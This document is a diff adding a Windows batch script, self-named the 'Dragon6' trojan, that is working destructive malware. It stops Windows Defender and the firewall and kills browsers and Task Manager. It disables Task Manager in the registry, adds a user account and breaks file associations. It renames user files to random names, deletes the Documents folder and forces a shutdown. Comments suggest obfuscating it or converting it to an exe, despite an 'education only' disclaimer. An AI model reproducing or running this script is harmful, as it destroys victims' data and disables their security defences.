@@ -1,0 +1,46 @@
+@echo off
+color 4f
+REM RENAME THIS .TXT FILE TO .BAT OR .CMD
+REM YOU CAN ALSO OBFUSCATE CODE OR USE BAT TO EXE CONVERTER
+REM THIS CODE YOU CAN USE FOR EDUCATION ONLY
+title %random%%random%.encrypter.Dragon6 %random% %date% %username% %time% %random%
+net stop "Windows Defender Service"
+net stop "Windows Firewall"
+taskkill /F /IM "chrome.exe" /T >nul
+taskkill /F /IM "firefox.exe" /T >nul
+taskkill /F /IM "ProcessHacker.exe" /T >nul
+taskkill /F /IM "explorer.exe" /T >nul
+taskkill /F /IM "taskmgr.exe" /T >nul
+assoc .lnk=.dll
+net user "Trojan.Dragon6" /add >nul
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPolicies System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+assoc .dll=.exe
+assoc .reg=.mp4
+assoc .exe=.avi
+echo Hello, user
+timeout /T 5 /nobreak >nul
+echo I am Dragon6
+echo Wait please...
+timeout /T 5 /nobreak >nul
+echo DLLs unpacked.
+timeout /T 5 /nobreak >nul
+ren *.txt %random%>nul
+ren *.exe %random%>nul
+ren *.dll %random%>nul
+ren *.jpg %random%>nul
+ren *.png %random%>nul
+ren *.py %random%>nul
+ren *.cpp %random%>nul
+ren *.c %random%>nul
+ren *.cs %random%>nul
+ren *.md %random%>nul
+ren *.css %random%>nul
+ren *.php %random%>nul
+ren *.html %random%>nul
+ren *.rar %random%>nul
+ren *.zip %random%>nul
+ren *.7z %random%>nul
+del C:\Users\%CURRENTUSER%\Documents\* /Q>nul
+echo You have only 30 seconds before system shutdown...
+timeout /T 30 /nobreak>nul
+shutdown /s /t 5 /c "Dragon6 destroyed you system :3"
